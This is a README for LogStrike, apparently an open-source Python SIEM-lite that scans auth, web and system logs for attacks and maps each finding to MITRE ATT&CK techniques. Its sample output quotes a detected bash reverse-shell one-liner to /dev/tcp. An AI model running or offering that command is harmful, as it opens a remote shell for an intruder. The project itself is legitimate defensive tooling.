# ⚡ LogStrike

> **Real-time log analysis & threat detection engine — mapped to MITRE ATT&CK®**

[![CI](https://github.com/Ernest-Kosmatko/LogStrike/actions/workflows/ci.yml/badge.svg)](https://github.com/Ernest-Kosmatko/LogStrike/actions)
[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Zero dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)]()
[![Author](https://img.shields.io/badge/author-Ernest--Kosmatko-orange.svg)](https://github.com/Ernest-Kosmatko)

```
  _                 ____  _        _ _
 | |    ___   __ _/ ___|| |_ _ __(_) | _____
 | |   / _ \ / _` \___ \| __| '__| | |/ / _ \
 | |__| (_) | (_| |___) | |_| |  | |   <  __/
 |_____\___/ \__, |____/ \__|_|  |_|_|\_\___|
             |___/
   Real-time Log Analysis & Threat Detection
   Author : Ernest Kosmatko (@Ernest-Kosmatko)
   GitHub : https://github.com/Ernest-Kosmatko/LogStrike
```

LogStrike is a lightweight **SIEM-lite** written in pure Python (zero external runtime dependencies). It ingests raw log files — `auth.log`, Apache/Nginx access logs, syslog, Windows Event logs — and surfaces malicious patterns in real time, correlating every finding against the [MITRE ATT&CK® framework](https://attack.mitre.org/).

---

## ✨ Features

| Capability | Detail |
|---|---|
| **15 detection rules** | SSH brute-force, SQLi, XSS, path traversal, web shells, reverse shells, crypto-miners, sudo abuse, SUID escalation, cron persistence, data exfiltration, account manipulation |
| **MITRE ATT&CK mapping** | Every finding includes tactic, technique ID, and a direct ATT&CK link |
| **Multi-format log support** | `auth.log` · syslog · Apache/Nginx combined · Windows Event Log |
| **Brute-force correlation** | Tracks failed auth attempts per IP; fires a campaign alert when threshold is crossed |
| **Real-time tail mode** | `--tail /var/log/auth.log` follows a live file, alerting instantly |
| **Flexible output** | Coloured terminal · JSON report · CSV export |
| **Zero dependencies** | Pure Python 3.11+ stdlib — no pip installs required beyond the package |
| **CI/CD ready** | Exits `2` if CRITICAL findings found — perfect for pipeline gates |

---

## 🚀 Quick Start

```bash
# Clone
git clone https://github.com/Ernest-Kosmatko/LogStrike.git
cd LogStrike

# Install (editable, dev extras for pytest)
pip install -e ".[dev]"

# Analyse sample logs
logstrike sample_logs/auth.log sample_logs/access.log

# Only show HIGH and above; save a JSON report
logstrike sample_logs/auth.log --severity HIGH --json report.json

# Watch a live log file in real-time
logstrike --tail /var/log/auth.log

# Pipe from stdin
cat /var/log/syslog | logstrike -

# Run unit tests
pytest -v
```

---

## 📖 CLI Reference

```
usage: logstrike [-h] [--tail FILE] [--severity {INFO,LOW,MEDIUM,HIGH,CRITICAL}]
                 [--json FILE] [--csv FILE] [--brute-threshold N]
                 [--quiet] [--no-banner] [--no-summary] [--version]
                 [LOG_FILE ...]

positional arguments:
  LOG_FILE              Log files to analyse. Use '-' to read from stdin.

options:
  --tail FILE           Watch a file in real-time (like tail -f).
  --severity, -s        Minimum severity to display (default: LOW).
  --json FILE           Save full JSON report to FILE.
  --csv  FILE           Save CSV report to FILE.
  --brute-threshold N   Failed auth attempts before brute-force alert (default: 5).
  --quiet, -q           Suppress per-finding output; only print summary.
  --no-banner           Suppress the ASCII banner.
  --no-summary          Suppress the summary block.
  --version, -v         Show version and exit.
```

---

## 🔍 Detection Rules & MITRE ATT&CK Coverage

| Rule ID | Name | Severity | Tactic | Technique |
|---------|------|----------|--------|-----------|
| LS-001 | SSH Brute Force Attempt | HIGH | Credential Access | T1110.001 |
| LS-002 | SSH Root Login Attempt | CRITICAL | Privilege Escalation | T1078.003 |
| LS-003 | SQL Injection Attempt | CRITICAL | Initial Access | T1190 |
| LS-004 | Cross-Site Scripting (XSS) | HIGH | Initial Access | T1190 |
| LS-005 | Path Traversal Attempt | HIGH | Discovery | T1083 |
| LS-006 | Web Shell Upload / Access | CRITICAL | Persistence | T1505.003 |
| LS-007 | Port Scan Detection | MEDIUM | Reconnaissance | T1046 |
| LS-008 | Sudo Privilege Escalation | HIGH | Privilege Escalation | T1548.003 |
| LS-009 | Suspicious SUID Binary | HIGH | Privilege Escalation | T1548.001 |
| LS-010 | Crontab Modification | HIGH | Persistence | T1053.003 |
| LS-011 | Large Outbound Transfer | HIGH | Exfiltration | T1048 |
| LS-012 | Reverse Shell Attempt | CRITICAL | Command & Control | T1059.004 |
| LS-013 | Cryptocurrency Miner | HIGH | Impact | T1496 |
| LS-014 | New User Account Created | MEDIUM | Persistence | T1136.001 |
| LS-015 | Password Change Detected | MEDIUM | Credential Access | T1098 |

---

## 🏗️ Architecture

```
LogStrike/
├── logstrike/
│   ├── __init__.py       # Package metadata & author info
│   ├── __main__.py       # python -m logstrike entry point
│   ├── cli.py            # Argument parsing, orchestration
│   ├── parser.py         # Multi-format log normaliser → LogEntry
│   ├── analyzer.py       # Rules engine + brute-force tracker → Finding
│   ├── rules.py          # 15 detection rules with MITRE ATT&CK metadata
│   └── reporter.py       # Terminal (ANSI), JSON, CSV output
├── tests/
│   └── test_logstrike.py # 14 unit tests
├── sample_logs/
│   ├── auth.log          # Realistic Linux auth log with attacks
│   ├── access.log        # Apache log with SQLi, XSS, web shells
│   └── example_report.json
├── .github/workflows/ci.yml
├── pyproject.toml
├── LICENSE
└── README.md
```

### Data flow

```
Raw log line
    │
    ▼
 parser.py ──► LogEntry (normalised: timestamp, IP, user, message, source)
    │
    ▼
analyzer.py ──► rules engine (regex match against 15 rules)
    │            brute-force tracker (IP → failure count)
    ▼
 Finding (rule + entry + detected_at)
    │
    ▼
reporter.py ──► terminal (ANSI colour) / JSON / CSV
```

---

## 📊 Sample Output

```
⚡ LogStrike — Real-time Log Analysis & Threat Detection
   Author : Ernest Kosmatko (@Ernest-Kosmatko)

[CRITICAL] LS-012 Reverse Shell Attempt
  ⏱  2024-05-12 09:20:00  |  IP: 10.99.0.1  |  User: -
  📋 Command and Control → T1059.004 – Command and Scripting Interpreter: Unix Shell
  🔗 https://attack.mitre.org/techniques/T1059/004/
  ✏  bash -i >& /dev/tcp/10.99.0.1/4444 0>&1

══════════════════════════════════════════════════════════════
  LogStrike — Analysis Summary
  Author    : Ernest Kosmatko (@Ernest-Kosmatko)
  Generated : 2024-05-12 09:30:00
──────────────────────────────────────────────────────────────
  Lines processed : 40
  Total findings  : 16

  Findings by Severity
  [CRITICAL]  █████████ 9
  [  HIGH  ]  █████ 5
  [  MEDIUM]  ██ 2

  MITRE ATT&CK Tactics Triggered
     4  Initial Access
     4  Persistence
     3  Privilege Escalation
     2  Discovery
```

---

## 🔧 Extending LogStrike

Adding a custom rule takes ~12 lines:

```python
# logstrike/rules.py — append to RULES list
from logstrike.rules import ThreatRule, Severity
import re

RULES.append(ThreatRule(
    id="LS-016",
    name="AWS Credential Exposure",
    description="AWS access key ID leaked in logs.",
    severity=Severity.CRITICAL,
    mitre_tactic="Credential Access",
    mitre_technique="T1552.001 – Credentials in Files",
    mitre_url="https://attack.mitre.org/techniques/T1552/001/",
    pattern=re.compile(r"AKIA[0-9A-Z]{16}", re.IGNORECASE),
    tags=["aws", "credentials", "secret"],
))
```

---

## 🔗 Related Projects by Ernest Kosmatko

- **[NetRecon](https://github.com/Ernest-Kosmatko/NetRecon)** — Active network scanner & host discovery tool

---

## 👤 Author

**Ernest Kosmatko**
GitHub: [@Ernest-Kosmatko](https://github.com/Ernest-Kosmatko)

---

## 📜 License

MIT © 2024 Ernest Kosmatko — see [LICENSE](LICENSE) for details.
